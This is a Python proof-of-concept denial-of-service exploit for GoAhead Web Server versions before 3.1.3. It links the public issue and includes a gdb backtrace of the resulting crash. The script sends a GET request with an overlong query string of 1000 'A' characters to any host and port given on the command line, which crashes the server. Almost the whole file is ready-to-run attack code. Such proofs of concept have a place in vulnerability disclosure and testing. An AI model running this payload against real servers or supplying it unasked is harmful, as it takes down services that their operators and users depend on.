#!/usr/bin/python

'''
GoAhead Web Server version prior to 3.1.3 is vulnerable to DoS. A fix exists for version 3.2.
The Web Server crashes completely once this requests is received. The vulnerability doesn't seem to be exploitable on Linux versions ... could be wrong :) !

Official Issue Post:
https://github.com/embedthis/goahead/issues/77

(gdb) bt
#0  0x00007ffff7a50425 in __GI_raise (sig=<optimized out>) at ../nptl/sysdeps/unix/sysv/linux/raise.c:64
#1  0x00007ffff7a53b8b in __GI_abort () at abort.c:91
#2  0x00007ffff7a8e39e in __libc_message (do_abort=2, fmt=0x7ffff7b98748 "*** glibc detected *** %s: %s: 0x%s ***\n") at ../sysdeps/unix/sysv/linux/libc_fatal.c:201
#3  0x00007ffff7a98b96 in malloc_printerr (action=3, str=0x7ffff7b98838 "munmap_chunk(): invalid pointer", ptr=<optimized out>) at malloc.c:5039
#4  0x00007ffff7fdc607 in termWebs (wp=0x40cfc0, reuse=<optimized out>) at src/http.c:457
#5  0x00007ffff7fdc91b in reuseConn (wp=0x40cfc0) at src/http.c:520
#6  complete (wp=0x40cfc0, reuse=1) at src/http.c:575
#7  0x00007ffff7fdd85f in websPump (wp=0x40cfc0) at src/http.c:837
#8  0x00007ffff7fdeac8 in readEvent (wp=0x40cfc0) at src/http.c:797
#9  socketEvent (wptr=0x40cfc0, mask=2, sid=<optimized out>) at src/http.c:735
#10 socketEvent (sid=<optimized out>, mask=2, wptr=0x40cfc0) at src/http.c:723
#11 0x00007ffff7fdee38 in websAccept (sid=1, ipaddr=0x7fffffffd990 "127.0.0.1", port=54172, listenSid=<optimized out>) at src/http.c:714
#12 0x00007ffff7feb66a in socketAccept (sp=0x40cb80) at src/socket.c:327
#13 0x00007ffff7feb7c8 in socketDoEvent (sp=0x40cb80) at src/socket.c:639
#14 socketProcess () at src/socket.c:623
#15 0x00007ffff7fd93ed in websServiceEvents (finished=0x4030f0) at src/http.c:1290
#16 0x00000000004012ee in main (argc=<optimized out>, argv=0x7fffffffdfd8, envp=<optimized out>) at src/goahead.c:146
'''


import socket
import os
import sys
import struct

HOST = sys.argv[1]
PORT = int(sys.argv[2])

crash = '?'*1 + 'A' * 1000

payload = 'GET ' + crash + ' HTTP/1.1\r\n'
payload += 'Host: ' + HOST + ':' + str(PORT) + '\r\n\r\n'

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((HOST,PORT))
expl.send(payload)
data = expl.recv(1024)
print data
expl.close()